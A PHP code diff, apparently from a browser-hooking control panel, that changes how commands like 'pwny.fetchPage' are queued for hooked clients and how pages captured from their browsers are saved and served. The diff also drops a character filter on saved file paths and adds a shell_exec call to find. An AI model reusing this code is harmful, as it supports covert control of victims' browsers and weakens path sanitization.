@@ -1518,7 +1518,7 @@ try{
 		case 'browse':
 			$client_id = isset($_REQUEST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUEST['client_id']) : false;
 			$client = new client($client_id);
-			$files = glob(USER_DIR . 'pages/*.html');
+			$files = explode("\n", shell_exec("find data/ -name '*.html'"));
 
 			if(empty($files)){
 				$client->addCmd("pwny.fetchPage(window.location.pathname)");
@@ -1731,7 +1731,7 @@ class client {
 	}
 
 	public function addCmd($cmd){
-		$check = "SELECT * FROM cmd_queue WHERE client_id=:client_id AND code=:cmd";
+		$check = "SELECT * FROM cmd_queue WHERE client_id=:client_id AND code=:cmd AND sent=0";
 		$check_stmt = $this->dbh->prepare($check);
 		$check_stmt->execute(array(':client_id' => $this->id, ':cmd' => $cmd));
 
@@ -1768,19 +1768,23 @@ class client {
 	public function savePage($page, $content){
 		$url = parse_url($page);
 		$url['path'] = clean_path($url['path']);
-		$p = escapeshellarg(dirname($url['path']));
+		$file = USER_DIR ."pages/{$url['path']}.html";
+
+		$p = escapeshellarg(dirname($file));
 		shell_exec("mkdir -p {$p}");
-		$file = USER_DIR .'pages/'. preg_replace('/[^a-zA-Z0-9_\.\/\-]/', '', $url['path']).'.html';
 		if(file_exists($file) === false){
 			file_put_contents($file, $content);
 		}
 	}
 
 	public function getPage($page){
-		$page = clean_path($page);
-		$full = USER_DIR .'pages/'. $page .'.html';
-		if(file_exists($full)){
-			return file_get_contents($full);
+
+		$url = parse_url($page);
+		$url['path'] = clean_path($url['path']);
+		$file = USER_DIR ."pages/{$url['path']}.html";
+
+		if(file_exists($file)){
+			return file_get_contents($file);
 		}
 		return false;
 	}
